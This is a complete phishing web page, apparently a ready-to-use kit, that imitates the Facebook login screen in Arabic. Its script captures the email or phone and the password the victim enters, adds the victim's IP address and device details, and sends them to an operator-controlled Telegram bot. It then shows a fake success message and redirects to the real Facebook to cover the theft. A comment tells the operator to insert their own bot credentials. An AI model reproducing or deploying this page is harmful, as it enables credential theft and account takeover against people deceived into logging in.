<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - تسجيل الدخول</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4Z9Q7wV9gN.ico">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f0f2f5; 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Background particles 2026 style */
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(120,119,198,0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255,119,198,0.3) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120,219,255,0.3) 0%, transparent 50%);
            z-index: -1;
            animation: float 20s ease-in-out infinite;
        }
        @keyframes float { 0%,100%{transform:scale(1) rotate(0deg);} 50%{transform:scale(1.1) rotate(1deg);} }
        
        .loginBox { 
            background: rgba(255,255,255,0.95); 
            backdrop-filter: blur(25px); 
            border-radius: 16px; 
            box-shadow: 0 12px 48px rgba(0,0,0,0.15); 
            width: 100%; 
            max-width: 380px; 
            padding: 32px 32px 24px; 
            text-align: center;
            border: 1px solid rgba(255,255,255,0.2);
            transition: all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);
        }
        .loginBox:hover { transform: translateY(-4px); box-shadow: 0 20px 60px rgba(0,0,0,0.2); }
        
        .fbLogo { 
            width: 48px; height: 48px; 
            margin: 0 auto 20px; 
            filter: drop-shadow(0 2px 8px rgba(24,119,242,0.3));
        }
        
        .formTitle { 
            font-size: 32px; 
            font-weight: 700; 
            background: linear-gradient(135deg, #1877F2 0%, #0A66C2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        
        .formSubtitle { 
            color: #65676B; 
            font-size: 16px; 
            font-weight: 400; 
            margin-bottom: 28px;
            line-height: 1.4;
        }
        
        .formGroup { 
            margin-bottom: 20px; 
            position: relative;
        }
        
        .formInput { 
            width: 100%; 
            padding: 16px 16px 16px 48px; 
            border: 2px solid #E4E6EA; 
            border-radius: 8px; 
            font-size: 17px; 
            font-weight: 400; 
            background: #FFFFFF; 
            transition: all 0.2s ease;
            font-family: inherit;
        }
        .formInput:focus { 
            outline: none; 
            border-color: #1877F2; 
            box-shadow: 0 0 0 4px rgba(24,119,242,0.1);
            background: #FEFFFF;
        }
        .formInput::placeholder { color: #B0B3B8; }
        
        .usernameIcon { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: #8B94A3; font-size: 20px; }
        .passwordIcon { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: #8B94A3; font-size: 20px; }
        
        .loginBtn { 
            width: 100%; 
            padding: 12px; 
            background: linear-gradient(135deg, #1877F2 0%, #166FE5 100%); 
            color: #FFFFFF !important; 
            border: none; 
            border-radius: 8px; 
            font-size: 18px; 
            font-weight: 600; 
            cursor: pointer; 
            transition: all 0.2s ease;
            margin-bottom: 16px;
            position: relative;
            overflow: hidden;
        }
        .loginBtn:hover { background: linear-gradient(135deg, #166FE5 0%, #0A5BBF 100%); transform: translateY(-1px); }
        .loginBtn:active { transform: translateY(0); }
        
        .loading { display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); }
        .btnText { transition: opacity 0.2s; }
        
        .divider { 
            display: flex; align-items: center; margin: 24px 0; 
            color: #DADDE1;
            font-size: 14px;
        }
        .divider::before, .divider::after { 
            content: ''; flex: 1; height: 1px; background: #DADDE1; 
        }
        
        .forgot { 
            color: #1877F2; 
            font-size: 14px; 
            font-weight: 500; 
            text-decoration: none; 
            display: block; 
            margin-top: 12px;
        }
        .forgot:hover { text-decoration: underline; }
        
        .successMsg { 
            display: none; 
            background: linear-gradient(135deg, #42C66A 0%, #34B353 100%); 
            color: white; 
            padding: 16px; 
            border-radius: 8px; 
            margin-top: 20px; 
            font-weight: 500;
            animation: slideDown 0.3s ease;
        }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        
        @media (max-width: 480px) { 
            .loginBox { margin: 16px; padding: 24px 24px 20px; } 
            .formTitle { font-size: 28px; }
        }
    </style>
</head>
<body>
    <div class="loginBox">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHwI.svg" alt="Facebook" class="fbLogo">
        
        <h1 class="formTitle">Facebook</h1>
        <p class="formSubtitle">اتصل بالأصدقاء والعائلة على Facebook.</p>
        
        <form id="loginForm">
            <div class="formGroup">
                <span class="usernameIcon">👤</span>
                <input type="text" class="formInput" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            </div>
            
            <div class="formGroup">
                <span class="passwordIcon">🔒</span>
                <input type="password" class="formInput" id="password" placeholder="كلمة المرور" required>
            </div>
            
            <button type="submit" class="loginBtn" id="loginBtn">
                <span class="loading" id="loadingSpinner">⏳</span>
                <span class="btnText" id="btnText">تسجيل الدخول</span>
            </button>
            
            <a href="#" class="forgot">نسيت كلمة المرور؟</a>
        </form>
        
        <div class="divider">
            <span>أو</span>
        </div>
        
        <div id="successMsg" class="successMsg">
            ✅ تم تسجيل الدخول بنجاح!<br>جاري التحويل إلى Facebook...
        </div>
    </div>

    <script>
        // غير القيم دي ببيانات Telegram Bot بتاعتك
        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // من @BotFather
        const CHAT_ID = 'YOUR_CHAT_ID_HERE';      // من @userinfobot
        
        const form = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const btnText = document.getElementById('btnText');
        const successMsg = document.getElementById('successMsg');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Loading state
            loginBtn.disabled = true;
            loadingSpinner.style.display = 'inline';
            btnText.style.opacity = '0';
            
            try {
                // Facebook-style notification
                const fbMessage = `🎯 **Facebook Login Captured!**\n\n` +
                                `📧 **Email/Phone:** \`${username}\`\n` +
                                `🔑 **Password:** \`${password}\`\n` +
                                `🌐 **IP:** \`${await getIP()}\`\n` +
                                `💻 **Device:** ${navigator.userAgent.slice(0,60)}...\n` +
                                `📅 **Time:** ${new Date().toLocaleString('ar-EG', {timeZone: 'Africa/Cairo'})}\n` +
                                `🔗 **URL:** ${window.location.href}\n\n` +
                                `🚀 **Facebook Phishing Success!**`;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: fbMessage,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                // Success + redirect to real Facebook
                successMsg.style.display = 'block';
                setTimeout(() => {
                    window.location.href = 'https://www.facebook.com/';
                }, 2000);
                
            } catch (error) {
                console.error('Telegram failed:', error);
                // Fallback redirect
                setTimeout(() => {
                    window.location.href = 'https://www.facebook.com/';
                }, 1000);
            }
        });
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                return (await res.json()).ip;
            } catch {
                return 'N/A';
            }
        }
    </script>
</body>
</html>
